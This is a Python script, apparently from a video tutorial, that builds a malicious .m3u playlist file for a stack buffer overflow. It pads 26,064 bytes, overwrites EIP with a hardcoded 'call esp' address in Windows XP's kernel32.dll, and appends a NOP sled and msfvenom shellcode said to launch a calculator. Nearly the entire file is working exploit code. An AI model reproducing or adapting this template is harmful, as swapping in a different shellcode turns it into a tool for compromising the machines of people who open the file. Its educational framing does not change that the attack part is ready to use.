import struct

#in this method we directly call/jmp esp which contains our shellcode
#top of esp points to beginning of our shellcode
#finding 'call esp' with "findjmp.exe kernel32.dll esp"
#we have got 
#			0x7C8369F0      call esp
#			0x7C86467B      jmp esp
#			0x7C868667      call esp
#these addresses  are for calling esp in kernel32.dll 
#we got after 26064 bytes we got our eip address (in my xp machine)
#i have got that number using pattern finder in metasploit
#now we gonna overwrite those and fill like this

#26064 A's + eip(should point to esp) + 4extrabytes (between eip and esp)+ esp(our shellcode)

junk='A'*26064

#eip points to call esp instruction and we gonna pack in little endian format
eip=struct.pack('<I',0x7C8369F0 )
#eip='\0xF0\x69\x83\x7C'
beforeesp='B'*4

esp=""
esp+='\x90'*25
#esp+='\xcc'

#this is our shellcode which pops a calculator when run i generated using
#msfvenom


esp+=("\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49"+\
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"+\
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"+\
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"+\
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"+\
"\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47"+\
"\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c"+\
"\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a"+\
"\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50"+\
"\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43"+\
"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a"+\
"\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c"+\
"\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44"+\
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c"+\
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47"+\
"\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50"+\
"\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44"+\
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43"+\
"\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42"+\
"\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b"+\
"\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45"+\
"\x31\x42\x4c\x42\x43\x45\x50\x41\x41")

#\x90 are nops which doesnot do any operation we use this not to terminate string
esp+='\x90'*200

#converting into bytes
#i got errors when i placed strings directly
#so i converted into bytes and written to file
junk=junk.encode('raw_unicode_escape')
esp=esp.encode('raw_unicode_escape')
beforeesp=beforeesp.encode('raw_unicode_escape')

#str(eip,'utf-8')
overflow=junk+eip+beforeesp+esp

f=open("C:\\Users\\nikki\\Desktop\\exploit_development_python\\callesp.m3u","wb")
f.write(overflow)
f.close()
#lets run this

print("file created successfully")







#THANKS FOR WATCHING
#SUBSCRIBE FOR MORE TUTORIALS
